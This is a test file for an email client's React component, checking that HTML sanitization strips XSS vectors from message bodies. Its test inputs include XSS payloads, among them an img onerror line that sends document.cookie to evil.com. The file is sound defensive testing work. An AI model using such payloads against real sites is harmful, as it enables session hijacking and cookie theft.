import { describe, it, expect, vi } from 'vitest';
import { render, screen } from '@testing-library/react';
import { EmailDetail } from './EmailDetail';
import type { Email } from '../types';

// Mock dependencies that aren't relevant to XSS testing
vi.mock('../state/compose', () => ({
  useCompose: () => ({ openNewMessage: vi.fn() }),
}));

vi.mock('../services/outlookplusApi', () => ({
  runAiRequest: vi.fn(),
}));

function makeEmail(bodyHtml: string): Email {
  return {
    id: 'test-1',
    sender: { name: 'Test User', email: 'test@example.com' },
    subject: 'Test Subject',
    preview: 'preview text',
    body: bodyHtml,
    date: '2025-01-01T00:00:00Z',
    read: true,
    folder: 'inbox',
    labels: ['test'],
    aiAnalysis: {
      category: 'Work',
      sentiment: 'neutral',
      summary: 'Test summary',
      suggestedActions: [],
    },
  };
}

describe('EmailDetail XSS sanitization', () => {
  it('strips <script> tags from email body', () => {
    const maliciousBody = '<p>Hello</p><script>alert("xss")</script>';
    render(<EmailDetail email={makeEmail(maliciousBody)} />);

    // The safe text content should still render
    expect(screen.getByText('Hello')).toBeInTheDocument();
    // The script tag must not be present in the DOM
    const bodyContainer = screen.getByText('Hello').closest('.prose');
    expect(bodyContainer?.innerHTML).not.toContain('<script');
  });

  it('strips onerror event handlers from img tags', () => {
    const maliciousBody =
      '<img src=x onerror="document.location=\'https://evil.com/?cookie=\'+document.cookie">';
    const { container } = render(
      <EmailDetail email={makeEmail(maliciousBody)} />
    );

    const img = container.querySelector('img');
    // The img element may or may not be kept, but the onerror handler must be stripped
    if (img) {
      expect(img.getAttribute('onerror')).toBeNull();
    }
    // Verify no onerror attribute exists anywhere in the rendered email body
    const bodyDiv = container.querySelector('.prose');
    expect(bodyDiv?.innerHTML).not.toMatch(/onerror/i);
  });

  it('strips onclick handlers from elements', () => {
    const maliciousBody =
      '<div onclick="alert(\'xss\')">Click me</div>';
    render(<EmailDetail email={makeEmail(maliciousBody)} />);

    const element = screen.getByText('Click me');
    expect(element.getAttribute('onclick')).toBeNull();
  });

  it('strips javascript: URLs from href attributes', () => {
    const maliciousBody =
      '<a href="javascript:alert(\'xss\')">Click here</a>';
    render(<EmailDetail email={makeEmail(maliciousBody)} />);

    const link = screen.getByText('Click here');
    const href = link.getAttribute('href');
    // href should either be removed or not contain javascript:
    expect(href ?? '').not.toMatch(/javascript:/i);
  });

  it('strips iframe tags', () => {
    const maliciousBody =
      '<p>Content</p><iframe src="https://evil.com"></iframe>';
    const { container } = render(
      <EmailDetail email={makeEmail(maliciousBody)} />
    );

    expect(screen.getByText('Content')).toBeInTheDocument();
    expect(container.querySelector('iframe')).toBeNull();
  });

  it('preserves safe HTML formatting', () => {
    const safeBody =
      '<h1>Title</h1><p>Paragraph with <strong>bold</strong> and <em>italic</em> text.</p>';
    const { container } = render(
      <EmailDetail email={makeEmail(safeBody)} />
    );

    expect(screen.getByText('Title')).toBeInTheDocument();
    expect(screen.getByText('bold')).toBeInTheDocument();
    expect(container.querySelector('strong')).toBeInTheDocument();
    expect(container.querySelector('em')).toBeInTheDocument();
  });

  it('strips embedded style tags that could hijack the UI', () => {
    const maliciousBody =
      '<style>body { display: none; }</style><p>Visible</p>';
    const { container } = render(
      <EmailDetail email={makeEmail(maliciousBody)} />
    );

    expect(screen.getByText('Visible')).toBeInTheDocument();
    const bodyDiv = container.querySelector('.prose');
    expect(bodyDiv?.querySelector('style')).toBeNull();
  });

  it('strips SVG-based XSS vectors', () => {
    const maliciousBody =
      '<svg onload="alert(\'xss\')"><circle r="50"></circle></svg>';
    const { container } = render(
      <EmailDetail email={makeEmail(maliciousBody)} />
    );

    const bodyDiv = container.querySelector('.prose');
    expect(bodyDiv?.innerHTML).not.toMatch(/onload/i);
  });
});
